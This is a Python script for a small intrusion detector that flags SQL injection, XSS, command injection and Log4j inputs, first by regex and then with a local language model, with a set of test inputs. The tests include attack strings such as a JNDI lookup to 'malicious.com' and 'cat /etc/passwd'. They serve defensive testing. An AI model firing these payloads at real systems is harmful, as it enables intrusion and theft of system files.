import requests
import re

# -------------------------------
# CONFIG
# -------------------------------
MODEL = "phi"   # using your existing model only

# -------------------------------
# Regex Library
# -------------------------------
regex_library = {
    "SQL Injection": r"('|\").*(OR|AND).*=.*",
    "XSS": r"<script.*?>.*?</script>",
    "Command Injection": r"(;|\|\||&&)\s*\w+",
    "Log4j": r"\$\{jndi:.*\}"
}

# -------------------------------
# Regex Detection (Fast)
# -------------------------------
def detect_with_regex(input_text):
    for attack, pattern in regex_library.items():
        if re.search(pattern, input_text, re.IGNORECASE):
            return attack
    return None

# -------------------------------
# AI Classification (Fixed)
# -------------------------------
def classify_with_ai(input_text):
    prompt = f"""
    You are a cybersecurity expert.

    Classify the following HTTP request into ONLY ONE:
    SQL Injection, XSS, Command Injection, Log4j, Normal.

    Respond with ONLY the category name.

    Request:
    {input_text}
    """

    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": MODEL,
                "prompt": prompt,
                "stream": False
            },
            timeout=30
        )

        data = response.json()

        # ✅ Fix: handle missing response key
        if "response" not in data:
            print("⚠️ API issue:", data)
            return "Unknown"

        result = data["response"].strip()

        categories = ["SQL Injection", "XSS", "Command Injection", "Log4j", "Normal"]

        for cat in categories:
            if cat.lower() in result.lower():
                return cat

        return "Unknown"

    except Exception as e:
        print("❌ Error:", e)
        return "Unknown"

# -------------------------------
# Logging Function
# -------------------------------
def log_anomaly(input_text, attack_type):
    try:
        with open("anomalies.log", "a") as file:
            file.write(f"{attack_type} | {input_text}\n")
    except Exception as e:
        print("⚠️ Logging error:", e)

# -------------------------------
# Hybrid Detection System
# -------------------------------
def detect_attack(input_text):
    # Step 1: Regex
    regex_result = detect_with_regex(input_text)
    if regex_result:
        return f"{regex_result} (Detected by Regex)"

    # Step 2: AI
    ai_result = classify_with_ai(input_text)

    # Log only suspicious
    if ai_result not in ["Normal", "Unknown"]:
        log_anomaly(input_text, ai_result)

    return f"{ai_result} (Detected by AI)"

# -------------------------------
# Test Cases
# -------------------------------
if __name__ == "__main__":
    test_inputs = [
        "' OR 1=1 --",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://malicious.com}",
        "Hello bro",
        "cat /etc/passwd",
        "admin' --"
    ]

    for test in test_inputs:
        print(f"Input: {test}")
        print(f"Output: {detect_attack(test)}")
        print("-" * 50)